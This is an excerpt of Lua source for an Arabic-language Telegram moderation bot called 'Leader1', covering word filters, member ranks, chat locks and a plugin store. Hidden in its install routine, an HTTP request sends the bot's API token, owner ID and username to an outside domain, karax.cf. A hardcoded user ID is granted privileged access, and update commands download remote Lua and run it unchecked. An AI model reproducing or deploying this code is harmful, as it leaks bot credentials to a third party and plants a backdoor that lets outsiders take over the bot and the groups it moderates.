...
https.request('http://karax.cf/Leader1/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("Leader1", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Leader1
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./Leader1.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S Leader1 -X kill
screen -S Leader1 ./Leader1
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Leader1TEAM/Files_Leader1/master/File_Bot/commands.lua") 
...
if tonumber(user_id) == tonumber(1247257732) then  
var = true  
...
local Leader1_Msg = ''  
if msgs < 100 then 
Leader1_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Leader1_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Leader1_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Leader1_Msg = 'متفاعل' 
elseif msgs < 1200 then 
Leader1_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Leader1_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Leader1_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Leader1_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Leader1_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
Leader1_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Leader1_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Leader1_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
Leader1_Msg = 'رب التفاعل'  
end 
return Leader1_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceLeader1(msg,data) -- بداية العمل
if msg then
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local Leader11 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..Leader11.server.uptime_in_days..'('..Leader11.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..Leader11.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..Leader11.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..Leader11.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ™' and SudoBot(msg) then 
os.execute('rm -rf Leader1.lua')
os.execute('wget https://raw.githubusercontent.com/o950/Leader1/master/Leader1.lua')
send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n📮| لديك اخر اصدار سورس القائد1\n📡| الاصدار ← { 1.2v}')
dofile('Leader1.lua')  
end
if text == 'الاصدار 📟' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'📡| اصدار سورس القائد1 \n📟| الاصدار ←{ 1.2v}') 
end
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..Leader1k..''..Leader1..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤| العضو » ['..result.title_..'](t.me/'..(username or 'VGY122')..')'
...
usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'VGY122')..')'
status  = '\n🔘| تم ترقيته مطور في البوت'
...
local Leader11_Msg = database:get(bot_id.."Leader11:Add:Filter:Rp2"..text..msg.chat_id_)   
if Leader11_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'VGY122')..') \n 📬|'..Leader11_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if Leader1_Msg and not Special(msg) then  
local Leader1_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Leader1_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..Leader1_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/VGY122)}\n🚫|["..Leader1_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠|عذرا يا » {["..data.first_name_.."](T.ME/VGY122)}\n📮| الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
🔖↬Leader1 TEAM
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📮↬[Channel Leader1](t.me/VGY122) 

🔰↬[Information](t.me/VGY122)

👮‍♂️↬[DEVELOPER](t.me/CCFRR)

🔖↬[The way his inauguration](https://t.me/VGY122/365)
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'VGY122')..') \n🔘| تـم قفـل الدردشه\n⛔| الحاله ← المسح ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'VGY122')..') \n🔘| تـم قفـل التاك بالكتم\n⛔| الحاله ←الكتم ')  
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Leader1TEAM/Files_Leader1/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n📁| اهلا بك في متجر ملفات القائد1\n🔰| ملفات السورس ↓\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\n"
local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n🔘|  علامة تعني { ✓ } ملف مفعل\n🔘| علامة تعني { ✘ } ملف معطل\n🔖| قناة سورس القائد1 ↓\n".."📮| [اضغط هنا لدخول](t.me/VGY122) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Leader1TEAM/Files_Leader1/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('Leader1.lua')  
else
send(msg.chat_id_, msg.id_,"⚠️| عذرا هاذا ملف ليس من ملفات سورس القائد1\n") 
end
return false
end
...
database:set(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"🚸|ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Leader11:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Leader11:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖|تم منع الكلمه مع التحذير")  
database:del(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Leader11:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Leader11:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Leader11:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖|ارسل الكلمه الان")  
database:set(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Leader11:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Leader11:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Leader11:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Leader11:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Leader11:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Leader11:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔|قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local Leader1_Msg = database:get(bot_id.."Leader11:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..Leader1_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..result.title_..'](t.me/'..(text1[3] or 'VGY122')..')'..'\n🔘| تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'القائد1').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'القائد1')
local Leader1_Msg = {
'اسمي مينو كول💘؟',
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
...
send(msg.chat_id_, msg.id_,'['..Leader1_Msg[math.random(#Leader1_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'القائد1').." غادر" or text == 'بوت غادر' then  
...
-- vardump(data) 
Leader1dx(msg.chat_id_, msg.id_, '📤| ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸| عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛| عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆| عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'القائد1')
...
Leader1 = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Leader1)
...
--------------------------------------------------------------------------------------------------------------
SourceLeader1(data.message_,data)
...
------------------------------------------------------------------------
local Leader1Abot = database:get(bot_id.."Leader11:Add:Filter:Rp2"..text..result.chat_id_)   
if Leader1Abot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..Leader1Abot.."] \n") 
...
------------------------------------------------------------------------
if text then
local Leader11_Msg = database:get(bot_id.."Leader11:Add:Filter:Rp2"..text..result.chat_id_)   
if Leader11_Msg then    
send(msg.chat_id_, msg.id_,"🔖|"..Leader11_Msg)
